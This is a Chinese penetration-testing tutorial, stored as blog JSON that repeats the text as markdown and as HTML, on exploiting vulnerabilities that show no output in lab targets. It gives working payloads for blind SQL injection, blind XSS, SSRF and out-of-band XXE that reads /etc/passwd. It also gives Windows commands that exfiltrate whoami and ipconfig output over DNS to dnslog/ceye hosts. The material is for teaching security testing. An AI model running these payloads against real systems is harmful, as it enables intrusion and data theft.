返回当前用户的配置文件的位置。\n//%WINDIR%                 系统       返回操作系统目录的位置。\n```\n#### 5.2.2 其他命令执行\n```http\ncmd /c whoami > temp && certutil -encode -f temp temp&&FOR /F \"eol=- delims=\" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,-1%.xxxx.ceye.io)&del temp\n```\n\n```http\ncmd /c ipconfig > temp && certutil -encode -f temp temp&&FOR /F \"eol=- delims=\" %i IN (temp) DO (set _=%i & cmd /c nslookup %_:~0,40%.xxxx.ceye.io & cmd /c nslookup %_:~40,-1%.xxxx.ceye.io)&del temp\n```\n\n通过POST传参测试\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162550-1ce46dae-aed3-4995-9021-f8a247144874.png#align=left&display=inline&height=95&margin=%5Bobject%2Object%5D&originHeight=159&originWidth=414&status=done&style=none&width=248)\n传参的内容需要进行url编码\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162770-391b3b8d-9947-440a-9529-5004a5bbd534.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&originHeight=431&originWidth=1521&status=done&style=none&width=415)\nPost传参\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163079-b19d4b32-222e-4b37-ab74-a88964a3839b.png#align=left&display=inline&height=138&margin=%5Bobject%2Object%5D&originHeight=407&originWidth=1226&status=done&style=none&width=416)\nDnslog获取结果\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163323-d049cc56-b450-4492-8ee3-434865c75b6c.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&originHeight=465&originWidth=1135&status=done&style=none&width=415)\nBase64解码获取内容\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505163685-f6a56798-fc6e-4dd3-8f6b-520b6a7efd23.png#align=left&display=inline&height=229&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=648&status=done&style=none&width=389)\n\n## 总结\n       在渗透测试过程中，无回显是很常见的，程序不可能将一些操作都回显到页面中，那么这种时候我们就需要外带数据来获取想要的内容。当然最好就是能够反弹shell，通过获取shell来执行命令，这样会舒服很多。\n       无回显的情况还有很多很多，这里简单介绍了几种，希望读者朋友们能够从中学到对于无回显的情况下如何进行渗透测试，方法很多，不固定，学习思路即可。\n","slug":"PHP无回显渗透测试总结","published":1,"updated":"2021-08-26T03:33:35.160Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpgk0059vkq3ghbw9asz","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<blockquote>\n<p>本文已发布到先知社区：<a href=\"https://xz.aliyun.com/t/9916\">https://xz.aliyun.com/t/9916</a></p>\n<p>作者：ajie</p>\n</blockquote>\n<h1 id=\"0x01前言\"><a href=\"#0x01前言\" class=\"headerlink\" title=\"0x01前言\"></a>0x01前言</h1><p>在渗透测试过程中，开发不可能每一次都将结果输出到页面上，也就是漏洞无回显的情况，那么在这种情况下，我们可以通过dnslog判断漏洞存在，或者通过起一个python的http服务来判断，方法很多，下面主要进行一些情况的分析。</p>\n<h1 id=\"0x02无回显概念\"><a href=\"#0x02无回显概念\" class=\"headerlink\" title=\"0x02无回显概念\"></a>0x02无回显概念</h1><p>无回显，即执行的payload在站点没有输出，无法进行进一步操作。在渗透测试过程中，漏洞点不可能总是能够在返回页面进行输出，那么这时候就需要进行一些无回显利用了。</p>\n<h1 id=\"0x03不同漏洞的无回显\"><a href=\"#0x03不同漏洞的无回显\" class=\"headerlink\" title=\"0x03不同漏洞的无回显\"></a>0x03不同漏洞的无回显</h1><h2 id=\"1、SQL注入无回显\"><a href=\"#1、SQL注入无回显\" class=\"headerlink\" title=\"1、SQL注入无回显\"></a>1、SQL注入无回显</h2><p>SQL注入，作为OWASP常年占据榜首位置的漏洞，在无回显中也是常见的。当然SQL注入在无回显上已经具有了一定的解决措施。<br>无回显我将其定义为页面没有输出我们想要得到的内容，下面以sqli-labs为例进行讲解。</p>\n<h3 id=\"1-1-布尔盲注\"><a href=\"#1-1-布尔盲注\" class=\"headerlink\" title=\"1.1 布尔盲注\"></a>1.1 布尔盲注</h3><p>       布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：<br>1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415\"><br>2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152514-71e97518-c208-4b9d-9a4e-61b1dcf4357f.png#align=left&display=inline&height=165&margin=%5Bobject%2Object%5D&originHeight=319&originWidth=802&status=done&style=none&width=415\"><br>3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152745-73cf1785-59ee-4551-9d74-7ba98d2cec44.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&originHeight=290&originWidth=790&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505152244-ad7b9b8a-6ea0-4cdd-a3e0-0a5eb45ed92f.png#align=left&display=inline&height=156&margin=%5Bobject%2Object%5D&originHeight=315&originWidth=837&status=done&style=none&width=415\"></p>\n<p>4、通过length()函数判断数据库库名的长度大于1。<br>?id=1’ and length(database())&gt;1 %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153079-ba58f545-ae61-431e-8818-bc12922659e2.png#align=left&display=inline&height=145&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=856&status=done&style=none&width=415\"><br>5、在大于8的时候页面返回空，所以数据库库名长度等于8。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153336-eed66eb5-75a1-4e17-b7fe-a758a9223de1.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=299&originWidth=847&status=done&style=none&width=415\"><br>6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码<br>?id=1’ and ascii(substr((select database()),1,1))&gt;97 %23<br>?id=1’ and ascii(substr((select database()),1,1))=101 %23<br>首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153599-f01e6d2c-ae3c-4f6f-b9ea-1f7fe4b77bdc.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&originHeight=310&originWidth=871&status=done&style=none&width=415\"><br>7、更改截取的位置，判断后面的字符对应的ascii码值。<br>?id=1’ and ascii(substr((select database()),2,1))=101 %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505153874-95d56f80-1ac9-4a44-93a7-b4d8f7c63939.png#align=left&display=inline&height=147&margin=%5Bobject%2Object%5D&originHeight=287&originWidth=810&status=done&style=none&width=416\"></p>\n<h3 id=\"1-2-延时盲注\"><a href=\"#1-2-延时盲注\" class=\"headerlink\" title=\"1.2 延时盲注\"></a>1.2 延时盲注</h3><p>       延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。<br>1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154171-53cd2d36-c123-4091-ba74-fb80319ba1f9.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&originHeight=277&originWidth=785&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154477-058cbb12-c306-42db-8afd-7b9c0b26dd87.png#align=left&display=inline&height=154&margin=%5Bobject%2Object%5D&originHeight=295&originWidth=796&status=done&style=none&width=416\"><br>2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4.*秒；使用sleep(5)延时5秒之后，页面响应时间为9.*秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505154774-5573d6ac-4de8-4808-b813-7c983b1e63a3.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&originHeight=418&originWidth=1448&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155245-cac61cf1-0e9f-41cf-a967-182f57ac1554.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&originHeight=382&originWidth=1371&status=done&style=none&width=415\"><br>3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。<br>?id=2’ and if((length(database())=8),sleep(5),1) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155513-36485f8a-abee-4402-a197-44636b0a2f86.png#align=left&display=inline&height=167&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1081&status=done&style=none&width=415\"><br>4、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。<br>?id=2’ and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %23<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505155940-da473dc6-2ac2-4ec1-b180-7c6456d0de47.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=423&originWidth=1220&status=done&style=none&width=415\"><br>5、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156315-650ab5b8-b418-4536-bc9e-ba70ca07f13c.png#align=left&display=inline&height=286&margin=%5Bobject%2Object%5D&originHeight=477&originWidth=666&status=done&style=none&width=400\"></p>\n<h3 id=\"巧用dnslog进行SQL注入\"><a href=\"#巧用dnslog进行SQL注入\" class=\"headerlink\" title=\"巧用dnslog进行SQL注入\"></a>巧用dnslog进行SQL注入</h3><p>       前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。</p>\n<h4 id=\"Dnslog\"><a href=\"#Dnslog\" class=\"headerlink\" title=\"Dnslog\"></a>Dnslog</h4><p>       dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。</p>\n<h4 id=\"Load-file-函数\"><a href=\"#Load-file-函数\" class=\"headerlink\" title=\"Load_file()函数\"></a>Load_file()函数</h4><p>       数据库中的load_file()函数，可以加载服务器中的内容。load_file(‘c:/1.txt’)，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：<br>       1.文件在服务器上<br>       2.指定完整路径的文件<br>       3.必须有FILE权限</p>\n<h4 id=\"UNC路径\"><a href=\"#UNC路径\" class=\"headerlink\" title=\"UNC路径\"></a>UNC路径</h4><p>       UNC路径就是类似\\softer这样的形式的网络路径。它符合 <strong>\\服务器名\\服务器资源</strong>的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。</p>\n<h4 id=\"Dnslog注入实例演示\"><a href=\"#Dnslog注入实例演示\" class=\"headerlink\" title=\"Dnslog注入实例演示\"></a>Dnslog注入实例演示</h4><p>1、打开实例站点，很明显这里是只能使用盲注的站点。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505156851-edecb966-dc2b-46c0-bbba-280a9a6586f7.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&originHeight=516&originWidth=1046&status=done&style=none&width=415\"><br>2、通过order by判断出字段数为3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157359-df1d201d-8e3f-4ae7-abad-93e6f6a15a3a.png#align=left&display=inline&height=238&margin=%5Bobject%2Object%5D&originHeight=451&originWidth=785&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505157735-72a8dfd4-3a1d-4bcb-a55f-ff7862eef954.png#align=left&display=inline&height=228&margin=%5Bobject%2Object%5D&originHeight=448&originWidth=814&status=done&style=none&width=415\"><br>3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158068-3fd1f43e-d354-4c51-a466-2c88660f7ff9.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1035&status=done&style=none&width=415\"><br>4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?id=1 &#x27; union select 1,2,load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.pcijrt.dnslog.cn</span><br><span class=\"line\">/abc&#x27;)) %23</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158457-b4c723f7-cdba-43c0-9fc4-5d284d9f1728.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&originHeight=413&originWidth=1189&status=done&style=none&width=415\"><br>5、执行语句之后在dnslog日志中获取到数据库库名为security。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505158874-723d612b-a6df-4d1d-a38b-98cf9036ddcb.png#align=left&display=inline&height=168&margin=%5Bobject%2Object%5D&originHeight=434&originWidth=1072&status=done&style=none&width=415\"><br>6、修改子查询里的内容，获取其他数据。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159168-1cca463c-9c90-42db-822d-f944b8727a1f.png#align=left&display=inline&height=185&margin=%5Bobject%2Object%5D&originHeight=537&originWidth=1209&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159492-cc5dc626-b30c-4763-8fb0-f6285add8085.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&originHeight=490&originWidth=1227&status=done&style=none&width=415\"></p>\n<h2 id=\"2、XSS无回显\"><a href=\"#2、XSS无回显\" class=\"headerlink\" title=\"2、XSS无回显\"></a>2、XSS无回显</h2><p>XSS无回显比较特殊，一般XSS漏洞的判断标准为弹框，但是有这样一种情况，在一个表单提交处，内容提交之后只会在页面显示提交成功与否，不会输出提交的内容，那么我们也就无法通过弹框来判断XSS漏洞存在与否。这时候就需要通过XSS盲打来进行攻击。下面通过Pikachu漏洞练习平台来进行实例讲解：</p>\n<h3 id=\"2-1-XSS盲打\"><a href=\"#2-1-XSS盲打\" class=\"headerlink\" title=\"2.1 XSS盲打\"></a>2.1 XSS盲打</h3><p>1、如图这里是一个提交看法的功能<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505159770-c89b0ec9-0436-4cf8-8f14-803ac998a67e.png#align=left&display=inline&height=171&margin=%5Bobject%2Object%5D&originHeight=500&originWidth=1217&status=done&style=none&width=415\"><br>2、随便输入内容提交，告诉我们提交成功，没有将我输入的内容返回到页面中<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160001-28ff893d-98ad-43cc-b6a4-3c8c2f982dc9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&originHeight=345&originWidth=569&status=done&style=none&width=341\"><br>3、登录后台可以看到确实有数据回显<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160252-54df82c0-b513-4071-b4fa-8f2716f4514a.png#align=left&display=inline&height=82&margin=%5Bobject%2Object%5D&originHeight=317&originWidth=1617&status=done&style=none&width=416\"><br>4、输入弹框语句会在后台成功执行<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160525-58331697-af8f-4fe1-a420-f170f43cb0d6.png#align=left&display=inline&height=128&margin=%5Bobject%2Object%5D&originHeight=362&originWidth=1175&status=done&style=none&width=415\"><br>5、在渗透测试过程中我们无法登录后台进行查看，那么就需要盲打XSS，输入XSS平台的payload，坐等管理员查看内容后上钩。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505160770-d75465c1-9a36-4a5f-bb0f-0256f7108eea.png#align=left&display=inline&height=235&margin=%5Bobject%2Object%5D&originHeight=395&originWidth=699&status=done&style=none&width=415\"></p>\n<h3 id=\"2-2-通过dnslog判断漏洞存在\"><a href=\"#2-2-通过dnslog判断漏洞存在\" class=\"headerlink\" title=\"2.2 通过dnslog判断漏洞存在\"></a>2.2 通过dnslog判断漏洞存在</h3><figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attribute\">payload</span>:</span><br><span class=\"line\">&lt;img src=http://xss.t7y3wc.dnslog.cn&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688564769-dcba54f1-6694-483e-bbb0-2ef4287b50e8.png#align=left&display=inline&height=294&margin=%5Bobject%2Object%5D&name=image.png&originHeight=588&originWidth=742&size=40726&status=done&style=none&width=371\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1626688575999-b7c4d322-0f4c-49a4-9da1-496c6dbc6b13.png#align=left&display=inline&height=223&margin=%5Bobject%2Object%5D&name=image.png&originHeight=446&originWidth=1636&size=54194&status=done&style=none&width=818\" alt=\"image.png\"></p>\n<h2 id=\"3、SSRF无回显\"><a href=\"#3、SSRF无回显\" class=\"headerlink\" title=\"3、SSRF无回显\"></a>3、SSRF无回显</h2><p>SSRF即服务端请求伪造，一种由攻击者构造的通过服务器发起请求的攻击。<br>测试代码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\">\t<span class=\"keyword\">echo</span> file_get_contents(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;url&#x27;</span>]);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>首先通过访问百度可以验证漏洞存在<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011741087-fbffd788-bf83-4b17-90e6-c147539273c9.png#align=left&display=inline&height=343&margin=%5Bobject%2Object%5D&name=image.png&originHeight=686&originWidth=1722&size=49389&status=done&style=none&width=861\" alt=\"image.png\"><br>无回显情况即不进行输出，页面返回空<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011767609-826cc500-1e74-42fc-bb0a-e205fd70abb9.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=812&size=9552&status=done&style=none&width=406\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011778291-6d43af3c-3612-4913-a7a4-98d96252c5ee.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=1002&size=18063&status=done&style=none&width=501\" alt=\"image.png\"><br>这种情况可以通过dnslog或者python搭建http服务验证<br>1、DNSLOG<br><a href=\"http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn\">http://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011861845-ebd9644c-a3d9-4fbd-8777-4c96a1ce90f7.png#align=left&display=inline&height=179&margin=%5Bobject%2Object%5D&name=image.png&originHeight=358&originWidth=1518&size=40848&status=done&style=none&width=759\" alt=\"image.png\"><br>2、python起的http服务</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -m http.server <span class=\"number\">4545</span></span><br></pre></td></tr></table></figure>\n<p><a href=\"http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545\">http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011927228-dc71a133-b743-44db-83a8-7847879faffa.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&name=image.png&originHeight=272&originWidth=1076&size=19631&status=done&style=none&width=538\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627011943684-3ba6d898-3620-4c3f-ade8-803b021288c7.png#align=left&display=inline&height=98&margin=%5Bobject%2Object%5D&name=image.png&originHeight=196&originWidth=1276&size=53498&status=done&style=none&width=638\" alt=\"image.png\"></p>\n<h2 id=\"4、XXE无回显\"><a href=\"#4、XXE无回显\" class=\"headerlink\" title=\"4、XXE无回显\"></a>4、XXE无回显</h2><p>因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到。XXE无回显问题当然也是可以通过在域名前面放入查询出的内容，将数据通过dns日志记录下来。<br>XXE虽然不是通过DNSlog，但是也同样是外带数据。<br>流程如下：<br>在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。<br>具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上。<br>1.xml</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!ENTITY% <span class=\"meta-keyword\">all</span> <span class=\"meta-string\">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://攻击者的IP地址/2.php?id=%file;&#x27;&gt;&quot;</span>&gt;</span>%all;</span><br></pre></td></tr></table></figure>\n<p>2.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> file_put_contents(<span class=\"string\">&quot;3.txt&quot;</span>,<span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;id&quot;</span>],FILE_APPEND);<span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>3.txt</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">内容空</span><br></pre></td></tr></table></figure>\n\n\n<p>payload：</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">ANY</span>[</span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">file</span> <span class=\"meta-keyword\">SYSTEM</span> <span class=\"meta-string\">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\"><span class=\"meta\">&lt;!ENTITY % <span class=\"meta-keyword\">remote</span> <span class=\"meta-keyword\">SYSTEM</span><span class=\"meta-string\">&quot;http://服务器IP地址/xxe/1.xml&quot;</span>&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">%remote;</span></span><br><span class=\"line\"><span class=\"meta\">%send;</span></span><br><span class=\"line\"><span class=\"meta\">]&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"5、命令执行无回显\"><a href=\"#5、命令执行无回显\" class=\"headerlink\" title=\"5、命令执行无回显\"></a>5、命令执行无回显</h2><p>简单的命令执行站点<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161034-780f4d5e-9f34-4707-a863-eafbd9d39650.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&originHeight=162&originWidth=520&status=done&style=none&width=312\"><br>输入任何命令都无回显<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161304-f8990d48-cbc4-4e55-8e44-d70081631de0.png#align=left&display=inline&height=102&margin=%5Bobject%2Object%5D&originHeight=216&originWidth=876&status=done&style=none&width=415\"></p>\n<h3 id=\"5-1-Dnslog判断漏洞存在\"><a href=\"#5-1-Dnslog判断漏洞存在\" class=\"headerlink\" title=\"5.1 Dnslog判断漏洞存在\"></a>5.1 Dnslog判断漏洞存在</h3><p><a href=\"http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn\">http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161596-6adcbdeb-489e-4552-be7c-a2a20628eaa6.png#align=left&display=inline&height=136&margin=%5Bobject%2Object%5D&originHeight=307&originWidth=940&status=done&style=none&width=415\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505161819-5b984f68-02b5-49b7-94b5-73127adb26da.png#align=left&display=inline&height=190&margin=%5Bobject%2Object%5D&originHeight=479&originWidth=1046&status=done&style=none&width=415\"></p>\n<h3 id=\"5-2Dnslog外带数据\"><a href=\"#5-2Dnslog外带数据\" class=\"headerlink\" title=\"5.2Dnslog外带数据\"></a>5.2Dnslog外带数据</h3><h4 id=\"5-2-1-获取windows用户名\"><a href=\"#5-2-1-获取windows用户名\" class=\"headerlink\" title=\"5.2.1 获取windows用户名\"></a>5.2.1 获取windows用户名</h4><figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/test_blind/exec.php?cmd=ping+%USERNAME%.io5a5i.dnslog.cn</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612505162343-fd422547-5db2-45b0-8264-c6a8b4324b2d.png#align=left&display=inline&height=163&margin=%5Bobject%2Object%5D&originHeight=430&originWidth=1093&status=done&style=none&width=415\"><br>windows常用变量：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//变量                     类型       描述</span><br><span class=\"line\">//%ALLUSERSPROFILE%        本地       返回“所有用户”配置文件的位置。</span><br><span class=\"line\">//%APPDATA%                本地       返回默认情况下应用程序存储数据的位置。</span><br><span class=\"line\">//%CD%                     本地       返回当前目录字符串。</span><br><span class=\"line\">//%CMDCMDLINE%             本地       返回用来启动当前的 Cmd.exe 的准确命令行。</span><br><span class=\"line\">//%CMDEXTVERSION%          系统       返回当前的“命令处理程序扩展”的版本号。</span><br><span class=\"line\">//%COMPUTERNAME%           系统       返回计算机的名称。</span><br><span class=\"line\">//%COMSPEC%                系统       返回命令行解释器可执行程序的准确路径。</span><br><span class=\"line\">//%DATE%                   系统       返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。</span><br><span class=\"line\">//%ERRORLEVEL%             系统       返回上一条命令的错误代码。通常用非零值表示错误。</span><br><span class=\"line\">//%HOMEDRIVE%              系统       返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span class=\"line\">//%HOMEPATH%               系统       返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。</span><br><span 